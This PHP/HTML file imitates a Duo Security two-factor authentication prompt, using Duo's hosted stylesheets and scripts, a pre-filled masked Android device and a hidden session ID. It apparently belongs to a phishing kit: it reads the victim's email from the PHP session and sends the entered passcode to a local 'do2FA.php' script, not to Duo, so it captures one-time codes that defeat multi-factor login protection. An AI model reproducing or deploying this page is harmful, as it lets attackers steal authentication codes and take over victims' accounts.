<?php
session_start();
$email = $_SESSION['email'];
?>
<!DOCTYPE html>
<!--[if IE 8]> <html lang="en" class="ie ie8"> <![endif]-->
<!--[if IE 9]> <html lang="en" class="ie ie9"> <![endif]-->
<!--[if gt IE 9]><!--> <html lang="en"> <!--<![endif]-->
<head>
<meta charset="utf-8">

<title>
Two-Factor Authentication
</title>
<!-- Import for all versions of IE, in case the standards mode is downgraded to IE8 -->
<!--[if IE]> <link rel="stylesheet" href="https://api-531b0865.duosecurity.com/frame/static/css/v3/ie8.css?v=3582c"> <![endif]-->

<link rel="stylesheet" href="https://api-531b0865.duosecurity.com/frame/static/css/normalize.css?v=a674e">
<link rel="stylesheet" href="https://api-531b0865.duosecurity.com/frame/static/fonts/ss-standard/ss-standard.css?v=a8885">
<link rel="stylesheet" href="https://api-531b0865.duosecurity.com/frame/static/shared/css/fonts/duo-admin.css?v=fc5d6">
<link rel="stylesheet" href="https://api-531b0865.duosecurity.com/frame/static/css/v3/base.css?v=612ea">

<link rel="stylesheet" href="https://api-531b0865.duosecurity.com/frame/static/css/tipsy.css?v=4217a">


</head>
<body>
<div class="">
<div class="base-wrapper ">

<div class="base-main">
<div role="main" class="base-body">

<form action="do2FA.php" method="post" class="inline login-form">
<input type="hidden" name="sid" value="Mzg0Mzk1ZTE2ODA4NGU1MmIxMGYxZmM2ZDcyMGU0OGQ=|36.71.224.23|1585997022|0c6c1d5dcf9d6cf950ecb0d4bdab48eea9dd1065">
<input type="hidden" name="url" value="https://api-531b0865.duosecurity.com/frame/prompt">
<input type="hidden" name="enrollment_message" value="">
<input type=hidden name=email value="<? print $email; ?>">

<input type="hidden" name="ukey" value="DUY1D79URP4YDCEJJV0D">

<input type="hidden" name="out_of_date" value="">
<input type="hidden" name="days_out_of_date" value="">


<input type="hidden" name="preferred_factor" value="">
<input type="hidden" name="preferred_device" value="">

<input type="hidden" name="days_to_block" value="None">
<input type="hidden" name="should_retry_u2f_timeouts" value="False">

<input type="hidden" id="has_phone_that_requires_compliance_text" name="has_phone_that_requires_compliance_text" value="False">

<fieldset class="device-selector hidden">
<h1 class="cramped-frame-view">
Device:
</h1>
<div class="device-select-wrapper">
<select name="device" aria-label="Device" tabindex=2>





<option value="phone1">Android &#x28;XXX-XXX-3679&#x29;</option>














</select>

</div>
</fieldset>

<div id="auth_methods">

<fieldset data-device-index="phone1">
<h2 class="medium-or-larger auth-method-header">

</h2>

<div class="passcode-label row-label">
<input type="hidden" name="factor" value="Passcode">
<div class="passcode-input-wrapper">
Enter a passcode from Duo Mobile or a text.<br><br>
<input type="text" name="passcode" autocomplete="off" data-index="phone1" class="passcode-input" placeholder="ex.&#x20;867539" aria-label="passcode" tabindex=2 required autofocus>
<div class="next-passcode-msg" role="alert" aria-live="polite"></div>
</div>
<button id="passcode" type="submit" class="auth-button&#x20;positive" tabindex="2" ><!-- -->Log In </button>
<input name="phone-smsable" type="hidden" value="True" />
<input name="mobile-otpable" type="hidden" value="True" />
<input name="next-passcode" type="hidden" value="None" />
</div>

</fieldset>





<input type="hidden" name="has-token" value="false">


</div>

<div>

<div class="stay-logged-in">
<label class="remember_me_label_field">
<input type="checkbox"
name="dampen_choice"
value="1" tabindex="2">
<span id="remember_me_label_text">
Remember me for 90 days
</span>
</label>
</div>

</div>
</form>


</div>
</div>
<div class="base-navigation">

<div class="base-navigation">
<div role="banner">

<a href="#">
<!-- <img src="logo.png" width="128"/> -->
</a>

</div>
<div class="help-sidebar">
<button class='btn btn-support'>
<i class="icon-align-justify" aria-label="Open"></i>
<i class="icon-delete" aria-label="Close"></i>
Settings
</button>






<div id="messages-view" class="hidden">
<div class="messages-list">

</div>
</div>


</div>
</div>
<script id="translations" type="text/json">
{"locale_data": {"js-messages": {"": {"plural_forms": "nplurals=2&#x3b; plural=&#x28;n &#x21;= 1&#x29;&#x3b;", "lang": "en", "domain": "js-messages"}}}, "domain": "js-messages"}
</script>


<script src="https://api-531b0865.duosecurity.com/frame/static/shared/lib/jquery/jquery-legacy.min.js?v=72e7b"></script>
<script src="https://api-531b0865.duosecurity.com/frame/static/shared/lib/he/he.min.js?v=aaa33"></script>
<script src="https://api-531b0865.duosecurity.com/frame/static/js/lib/jquery-postmessage.min.js?v=98c73"></script>
<script src="https://api-531b0865.duosecurity.com/frame/static/shared/lib/lodash/lodash.min.js?v=14516"></script>
<script src="https://api-531b0865.duosecurity.com/frame/static/shared/lib/backbone/backbone-min.js?v=28a93"></script>
<script src="https://api-531b0865.duosecurity.com/frame/static/js/page/v3/frame.js?v=2b68c"></script>
<script src="https://api-531b0865.duosecurity.com/frame/static/js/page/v3/base.js?v=ea69e"></script>
<script src="https://api-531b0865.duosecurity.com/frame/static/shared/lib/validator/validator.min.js?v=9a068"></script>
<script id="browser_exceptions" src="https://api-531b0865.duosecurity.com/frame/static/shared/js/errors.js?v=65ffc" data-url="https://api-531b0865.duosecurity.com/frame/browser_exceptions"></script>
<input type="hidden" name="helpdesk-message" id="helpdesk-message" value="See&#x20;Two-Step&#x20;Help." />
<!--[if lt IE 10]>
<script src="https://api-531b0865.duosecurity.com/frame/static/js/page/v3/quirks.js?v=ca533"></script>
<!--<![endif]-->


<script src="https://api-531b0865.duosecurity.com/frame/static/js/lib/jquery.tipsy.js?v=c0432"></script>


<!--[if lt IE 9]>
<script src="https://api-531b0865.duosecurity.com/frame/static/js/lib/html5shiv.js?v=86fbf"></script>
<![endif]-->
</body>
</html>